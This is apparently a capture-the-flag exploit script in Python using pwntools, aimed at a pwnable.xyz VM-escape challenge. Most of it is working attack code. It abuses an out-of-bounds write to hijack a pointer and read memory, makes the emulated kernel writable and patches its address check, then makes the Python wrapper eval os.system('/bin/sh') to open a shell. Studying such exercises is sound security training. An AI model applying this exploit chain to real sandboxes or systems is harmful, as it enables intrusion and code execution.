###VM escape problem
###Utilize the same OOB bug in user space to achieve stage1:userspace read/write, stage2:kernelspace read/write, stage3:vm escape

from pwn import *

context.arch = 'amd64'

###Structure
'''
note
    |   8   |   8   |
0x00|   id  |noteptr|
0x10|  size | serial|
0x20|funcptr|
'''

###Addr
flag1 = 0x4100000
syscall_func = 0x4000338
note = 0x4100380
bss = 0x4100800
flag2 = 0xffffffff81005000
k_addr = 0xffffffff81000000
k_write_chk = 0xffffffff810000f7
k_syscall_10_rax = 0xffffffff81000137

###Util
def edit(idx,data):
    r.sendlineafter('Exit\n','1')
    r.sendlineafter('id: ',str(idx))
    r.sendlineafter('Contents: ',data)

def call_func(idx,mode='write',payload=None):
    r.sendlineafter('Exit\n','2')
    r.sendlineafter('id: ',str(idx))
    if mode=='write':
        return r.recvuntil('\n1. Edit',drop=True)
    elif mode=='read':
        r.send(payload)
    elif mode=='shell':
        r.interactive()

def show_kernel_code():
    s = open('kernel','rb').read()
    print('0x00 : ')
    print(disasm(s[:0x15]))
    print('0x15 : ')
    print('  ',hex(u64(s[0x15:0x1d])))
    print('0x1d : ')
    print('  ',hex(u64(s[0x1d:0x25])))
    print('0x25 : ')
    print('  ',hex(u64(s[0x25:0x2d])))
    print('0x2d : ')
    print(disasm(s[0x2d:0x43]))
    print(s[0x43:0x56])
    print('0x56 : ')
    print(disasm(s[0x56:0x6d]))
    print(s[0x6d:0x7e])
    print('0x7e : ')
    print(disasm(s[0x7e:0x94]))
    print(s[0x94:0xa8])
    print('0xa8 : ')
    print(disasm(s[0xa8:0x280]))
    print('0x280 : ')
    for i in range(62):
        print('  ',hex(u64(s[0x280+i*8:0x280+(i+1)*8])))

def stage1():
    ###OOB to hijack noteptr and achieve arbitrary userspace read
    for i in range(9):
        print(i)
        edit(i,'M30W')
    edit(9,b'a'*0x8+p64(0)+p64(flag1)+p64(0x100))
    print(call_func(0,mode='write'))

def stage2():
    ###Escalate into kernel space read/write
    for i in range(9):
        print(i)
        edit(i,'M30W')
    ###Since the original input method is readline(), setting syscall 10 must be done by read syscall
    edit(9,p64(0)+p64(0)+p64(0)+p64(note)+p64(0x28)+p64(syscall_func))
    call_func(0,mode='read',payload=p64(10)+p64(k_addr)+p64(0x100000)+p64(7)+p64(syscall_func))
    ###Mprotect to make kernel code writeable
    call_func(0,mode='mprotect')
    ###Patch write syscall to bypass address check
    edit(9,p64(0)+p64(0)+p64(0)+p64(k_write_chk)+p64(2)+p64(syscall_func))
    call_func(0,mode='read',payload=b'\x90\x90')
    ###Leak flag2 in kernel space
    edit(9,p64(0)+p64(1)+p64(1)+p64(flag2)+p64(0x100)+p64(syscall_func))
    print(call_func(0,mode='write'))

def stage3():
    ###Escape vm and get shell with python
    for i in range(9):
        print(i)
        edit(i,'M30W')
    ###Just the same as level 2, call mprotect to make kernel writeable
    edit(9,p64(0)+p64(0)+p64(0)+p64(note)+p64(0x28)+p64(syscall_func))
    call_func(0,mode='read',payload=p64(10)+p64(k_addr)+p64(0x100000)+p64(7)+p64(syscall_func))
    call_func(0,mode='mprotect')
    ###Notice in start.py wrapper, when calling syscall(10), a check is carried on rax value
    ###If rax=0, normal mprotect is done, else if rax=7, the arguments are extracted and passed to eval() in python wrapper
    ###The default behaviour in kernel is to set rax to 0, however, since kernel is now modifiable, we can easily patch it to make rax=7
    edit(9,p64(0)+p64(0)+p64(0)+p64(k_syscall_10_rax)+p64(1)+p64(syscall_func))
    call_func(0,mode='read',payload=b'\x07')
    ###Write python function to be evaluated
    edit(9,p64(0)+p64(0)+p64(0)+p64(bss)+p64(0x14)+p64(syscall_func))
    call_func(0,mode='read',payload="os.system('/bin/sh')")
    ###Call syscall(10) and get shell
    edit(9,p64(0)+p64(0)+p64(0)+p64(note)+p64(0x28)+p64(syscall_func))
    call_func(0,mode='read',payload=p64(10)+p64(bss)+p64(bss)+p64(0x14)+p64(syscall_func))
    call_func(0,mode='shell')

def stage_select(stage):
    globals()['stage'+str(stage)]()

###Exploit
show_kernel_code()
r = remote('svc.pwnable.xyz',30048)
stage_select(3)
